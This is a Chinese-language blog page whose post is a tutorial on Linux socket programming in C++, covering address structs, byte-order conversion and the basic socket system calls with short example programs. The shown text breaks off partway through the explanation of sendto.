<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="May the Force be with you.">
<meta property="og:type" content="website">
<meta property="og:title" content="hxt&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="hxt&#39;s Blog">
<meta property="og:description" content="May the Force be with you.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hxt">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hxt's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hxt's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/03/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/03/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">Linux网络编程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-03 00:00:00 / 修改时间：13:38:57" itemprop="dateCreated datePublished" datetime="2025-04-03T00:00:00+08:00">2025-04-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">网络编程</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>16 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="网络编程基础api">网络编程基础API</h2>
<p><strong>补充知识</strong></p>
<ul>
<li>主机字节序：一般为<strong>小端序</strong>（低位放在较小的地址处，高位放在较大的地址处）</li>
<li>网络字节序：一般为<strong>大端序</strong></li>
</ul>
<p>示例：0x01234567，其中 0x01 是最高位有效字节，0x67
是最低位有效字节</p>
<h3 id="套接字地址">套接字地址</h3>
<p>套接字地址（<strong>Socket Address</strong>）是 <strong>IP
地址和端口号的组合</strong>，用于唯一标识网络上的一个进程。</p>
<ol type="1">
<li><p><code>struct sockaddr</code></p>
<p><code>sockaddr</code>
是一个<strong>通用的地址结构体</strong>，它的定义如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;  <span class="comment">// 地址族（AF_INET, AF_INET6等）</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];       <span class="comment">// 地址数据（具体的地址信息）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<p><strong>成员解析</strong>：</p>
<ul>
<li><code>sa_family_t sa_family</code>：地址族（例如
<code>AF_INET</code> 表示 IPv4，<code>AF_INET6</code> 表示 IPv6）。</li>
<li><code>char sa_data[14]</code>：存储具体的地址数据（IP 地址 +
端口）。</li>
</ul>
<p><strong>⚠️ <code>sockaddr</code>
本身不会直接使用，而是由更具体的结构体（如 <code>sockaddr_in</code> 和
<code>sockaddr_in6</code>）进行扩展。</strong></p></li>
<li><p><code>sockaddr_in</code>（IPv4 地址）</p>
<p><code>sockaddr_in</code> 结构体是 <code>sockaddr</code>
的<strong>专门版本</strong>，用于<strong>IPv4 地址</strong>：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span>  <span class="comment">// sockaddr_in 定义在这个头文件中</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sin_family;   <span class="comment">// 地址族（必须是 AF_INET）</span></span><br><span class="line">    <span class="type">in_port_t</span> sin_port;       <span class="comment">// 端口号（网络字节序）</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;  <span class="comment">// IPv4 地址</span></span><br><span class="line">    <span class="type">char</span> sin_zero[<span class="number">8</span>];         <span class="comment">// 备用字段（填充用，一般不用）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>这里的<code>struct in_addrc</code>的详细代码定义在<code>&lt;netinet/in.h&gt;</code>文件头中：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">in_addr</span> {</span><br><span class="line">    <span class="type">uint32_t</span> s_addr;  <span class="comment">// 32 位 IPv4 地址（网络字节序）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p><strong>示例代码（IPv4 地址转换）：</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>  <span class="comment">// 包含 inet_pton 和 inet_ntoa</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">8080</span>);  <span class="comment">// 端口号转换为网络字节序</span></span><br><span class="line">    <span class="built_in">inet_pton</span>(AF_INET, <span class="string">"192.168.1.1"</span>, &amp;addr.sin_addr);  <span class="comment">// 将IP字符串转换为二进制格式</span></span><br><span class="line">    <span class="comment">// 第三个参数 &amp;addr.sin_addr 表示转换后的二进制 IP 地址的存储位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印转换后的信息</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"IP: "</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(addr.sin_addr) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Port: "</span> &lt;&lt; <span class="built_in">ntohs</span>(addr.sin_port) &lt;&lt; std::endl;  <span class="comment">// 端口转换回主机字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>函数解析</strong>：</p>
<ul>
<li><code>htons(port)</code>：将主机字节序的<strong>端口号</strong>转换为<strong>网络字节序</strong>。</li>
<li><code>ntohs(port)</code>：将网络字节序的<strong>端口号</strong>转换回<strong>主机字节序</strong>。</li>
<li><code>inet_pton(AF_INET, "192.168.1.1", &amp;addr.sin_addr)</code>：将
IPv4 字符串转换为二进制格式。为了后续的 socket 操作（例如
<code>connect</code> 或 <code>bind</code>）能够使用正确的二进制格式的 IP
地址。</li>
<li><code>inet_ntoa(addr.sin_addr)</code>：将二进制 <strong>IP
地址</strong>转换为可读的字符串。</li>
</ul></li>
<li><p><code>sockaddr_in6</code>（IPv6 地址）</p>
<p>IPv6 地址使用 <code>sockaddr_in6</code> 结构体：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> {</span><br><span class="line">    <span class="type">sa_family_t</span> sin6_family;     <span class="comment">// 地址族（必须是 AF_INET6）</span></span><br><span class="line">    <span class="type">in_port_t</span> sin6_port;         <span class="comment">// 端口号（网络字节序）</span></span><br><span class="line">    <span class="type">uint32_t</span> sin6_flowinfo;      <span class="comment">// IPv6 流量控制信息（一般设为 0）</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr;   <span class="comment">// IPv6 地址</span></span><br><span class="line">    <span class="type">uint32_t</span> sin6_scope_id;      <span class="comment">// 作用域 ID（用于本地连接）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<p><strong>示例代码（IPv6 地址转换）：</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> addr6;</span><br><span class="line">    addr6.sin6_family = AF_INET6;</span><br><span class="line">    addr6.sin6_port = <span class="built_in">htons</span>(<span class="number">9090</span>);  <span class="comment">// 端口号</span></span><br><span class="line">    <span class="built_in">inet_pton</span>(AF_INET6, <span class="string">"::1"</span>, &amp;addr6.sin6_addr);  <span class="comment">// 将 IPv6 地址转换为二进制</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ip_str[INET6_ADDRSTRLEN];</span><br><span class="line">    <span class="built_in">inet_ntop</span>(AF_INET6, &amp;addr6.sin6_addr, ip_str, <span class="built_in">sizeof</span>(ip_str));  <span class="comment">// 转换回可读字符串</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"IPv6: "</span> &lt;&lt; ip_str &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Port: "</span> &lt;&lt; <span class="built_in">ntohs</span>(addr6.sin6_port) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>IPv6 相关函数</strong>：</p>
<ul>
<li><code>inet_pton(AF_INET6, "::1", &amp;addr6.sin6_addr)</code>：将
IPv6 地址字符串转换为二进制格式。</li>
<li><code>inet_ntop(AF_INET6, &amp;addr6.sin6_addr, ip_str, sizeof(ip_str))</code>：将
IPv6 二进制地址转换回字符串。</li>
</ul></li>
</ol>
<h3 id="创建套接字">创建套接字</h3>
<p>socket系统调⽤成功时返回⼀个socket⽂件描述符，失败则返回-1</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>＜sys/socket.h＞</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span><span class="params">(<span class="type">int</span> domain,<span class="type">int</span> type,<span class="type">int</span> protocol)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>参数解析：</strong></p>
<ul>
<li><code>domain</code>（协议族）：<code>AF_INET</code>（IPv4）、<code>AF_INET6</code>（IPv6）、<code>AF_UNIX</code>（本地通信）</li>
<li><code>type</code>（套接字类型）：<code>SOCK_STREAM</code>（流服务，TCP）、<code>SOCK_DGRAM</code>（数据报服务，UDP）</li>
<li><code>protocol</code>（协议）：<code>0</code>（默认），<code>IPPROTO_TCP</code>（TCP），<code>IPPROTO_UDP</code>（UDP）</li>
</ul>
<h3 id="绑定套接字">绑定套接字</h3>
<p><code>bind</code>函数<strong>将套接字（socket）与本地 IP
地址和端口号绑定</strong>，即上面提到的两个关键字，这样客户端可以连接到该地址。成功时返回0，失败则返回-1</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>参数解析：</strong></p>
<ul>
<li><code>sockfd</code>：<strong>要绑定的 socket 文件描述符</strong>（由
<code>socket()</code> 创建）</li>
<li><code>addr</code>：<strong>要绑定的本地地址（IP +
端口）</strong>，需要转换为 <code>sockaddr*</code>
类型（默认套接字地址类型）</li>
<li><code>addrlen</code>：<strong>地址结构体的大小</strong>（通常用
<code>sizeof(struct sockaddr_in)</code>）</li>
</ul>
<p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> sockfd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);  <span class="comment">// 创建 TCP 套接字</span></span><br><span class="line">    <span class="keyword">if</span> (sockfd == <span class="number">-1</span>) {</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr {};</span><br><span class="line">    addr.sin_family = AF_INET;  <span class="comment">// 使用 IPv4</span></span><br><span class="line">    addr.sin_addr.s_addr = INADDR_ANY;  <span class="comment">// 绑定到本机所有 IP</span></span><br><span class="line">    addr.sin_port = <span class="built_in">htons</span>(<span class="number">8080</span>);  <span class="comment">// 绑定端口 8080</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 绑定</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">bind</span>(sockfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="built_in">sizeof</span>(addr)) == <span class="number">-1</span>) {</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">"bind failed"</span>);</span><br><span class="line">        <span class="built_in">close</span>(sockfd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Socket bound to port 8080"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">close</span>(sockfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="监听套接字">监听套接字</h3>
<p><code>listen</code>函数创建⼀个监听队列以存放待处理的客户连接。成功时返回0，失败则返回-1。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> backlog)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>参数解析：</strong></p>
<ul>
<li><code>sockfd</code>：socket 文件描述符，通常是通过
<code>socket()</code> 创建并已绑定地址和端口的 socket</li>
<li><code>backlog</code>：连接队列的最大长度。
<ul>
<li>当多个客户端同时尝试连接服务器时，未处理的连接请求会被放入队列中。</li>
<li><code>backlog</code>
指定了队列的最大长度。如果队列已满，新的连接请求会被拒绝。</li>
</ul></li>
</ul>
<blockquote>
<p>监听队列中<strong><code>ESTABLISHED</code> 状态</strong> 的连接表示
<strong>三次握手成功</strong>，连接已建立，可以通信。但此时连接还在
<strong>监听队列</strong> 中，服务器端还
<strong>不能直接读写数据</strong>，需要通过 <code>accept()</code>
取出连接。</p>
</blockquote>
<h3 id="接受连接">接受连接</h3>
<p><code>accept</code>函数从<code>listen</code>监听队列中接受⼀个连接。成功返回新的<strong>已连接套接字描述符</strong>，用于与客户端通信；失败返回<code>-1</code>。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>参数解析：</strong></p>
<ul>
<li><code>sockfd</code>：socket文件描述符（这里是被监听的socket）</li>
<li><code>addr</code>：指向存储客户端地址信息的结构体，通常为
<code>sockaddr_in</code> 或 <code>sockaddr_in6</code></li>
<li><code>addrlen</code>：指向地址长度的指针，调用前应设置为
<code>addr</code> 的长度，调用后会被修改为实际地址长度。</li>
</ul>
<h3 id="发起连接">发起连接</h3>
<p><code>connect</code>函数⽤来主动与服务器建⽴连接。成功返回<code>0</code>，失败返回<code>-1</code>。⼀旦成功建⽴连接，sockfd就唯⼀地标识了这个连接，客户端就可以通过读写<code>sockfd</code>来与服务器通信。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>参数解析：</strong></p>
<ul>
<li><code>sockfd</code>：文件描述符</li>
<li><code>addr</code>：<strong>服务器地址</strong>信息，包括 IP
和端口。</li>
<li><code>addrlen</code>：<code>addr</code>的大小</li>
</ul>
<blockquote>
<p><strong><code>connect</code> 是客户端主动建立连接</strong></p>
<p><strong><code>accept</code>是服务器被动接受连接</strong></p>
</blockquote>
<h3 id="关闭连接">关闭连接</h3>
<h4 id="close">close</h4>
<p>关闭<code>sockfd</code>对应的socket连接。成功返回<code>0</code>，失败返回<code>-1</code>。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">close</span><span class="params">(<span class="type">int</span> sockfd)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><strong>引用计数机制</strong>：</p>
<ul>
<li>内核维护<strong>文件描述符的引用计数</strong>。</li>
<li>调用 <code>close()</code> 时，引用计数 <strong>减 1</strong>。</li>
<li>当引用计数为 0，才真正关闭连接</li>
</ul>
<h4 id="shutdown">shutdown</h4>
<p>如果⽆论如何都要⽴即终⽌连接（⽽不是将socket的引⽤计数减1），可以使⽤的<code>shutdown</code>系统调⽤。成功时返回<code>0</code>，失败则返回<code>-1</code>。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">shutdown</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">int</span> how)</span></span>;</span><br><span class="line"><span class="comment">/* how 参数表示关闭方式：SHUT_RD、SHUT_WR、SHUT_RDWR */</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>shutdown</code>能够分别关闭socket上的读或写，或者都关闭。⽽<code>close</code>在关闭连接时只能将socket上的读和写同时关闭。</p>
<h3 id="数据读写">数据读写</h3>
<p>对文件的读写操作<code>read</code>和<code>write</code>同样适用于socket</p>
<h4 id="tcp数据读写">TCP数据读写</h4>
<ol type="1">
<li><p><code>send()</code></p>
<p><strong>发送数据</strong>到已连接的 <strong>TCP
套接字</strong>中。成功则返回<strong>实际发送的字节数</strong>，失败则返回
<code>-1</code> 。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">send</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>sockfd</code>：已连接的套接字描述符</li>
<li><code>buf</code>：指向<strong>待发送数据</strong>的缓冲区</li>
<li><code>len</code>：带发送数据的长度</li>
<li><code>flags</code>：控制发送行为（一般为0）
<ul>
<li><code>0</code>：标准阻塞发送</li>
<li><code>MSG_DONTWAIT</code>：<strong>非阻塞发送</strong>，若缓冲区满，则立即返回</li>
<li><code>MSG_NOSIGNAL</code>：<strong>不触发 SIGPIPE
信号</strong>，在对端关闭时返回错误</li>
</ul></li>
</ul></li>
<li><p><code>recv()</code></p>
<p><strong>从 TCP
套接字接收数据</strong>并存入缓冲区。成功则返回<strong>接收到的字节数</strong>（<code>0</code>：表示
<strong>对方关闭连接</strong>，即发送了 <code>FIN</code>
包），失败则返回<code>-1</code>。可能要多次调⽤<code>recv</code></p>
<p><strong>失败</strong>：返回 <code>-1</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>sockfd</code>：已连接的套接字描述符</li>
<li><code>buf</code>：指向<strong>存放接收数据</strong>的缓冲区</li>
<li><code>len</code>：缓冲区大小</li>
<li><code>flags</code>：控制发送行为（一般为0）
<ul>
<li><code>0</code>：标准阻塞接收</li>
<li><code>MSG_DONTWAIT</code>：<strong>非阻塞接收</strong>，若无数据则立即返回</li>
<li><code>MSG_PEEK</code>：<strong>窥视模式</strong>，读取数据但不删除缓冲区中的内容</li>
</ul></li>
</ul></li>
</ol>
<h4 id="udp数据报读写">UDP数据报读写</h4>
<ol type="1">
<li><p><code>sendto()</code></p>
<p>发送 UDP
数据报到指定的目标地址。成功则返回<strong>实际发送的字节数</strong>，失败则返回
<code>-1</code>。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="type">const</span> <span class="keyword">struct</span> sockaddr *dest_addr, <span class="type">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>sockfd</code>： 套接字描述符</li>
<li><code>buf</code>：指向 <strong>待发送数据</strong> 的缓冲区</li>
<li><code>len</code>：待发送数据长度</li>
<li><code>flags</code>：控制发送行为（一般为0）</li>
<li><code>dest_addr</code>（结构体）：目标地址，通常为
<code>sockaddr_in</code> 或 <code>sockaddr_in6</code></li>
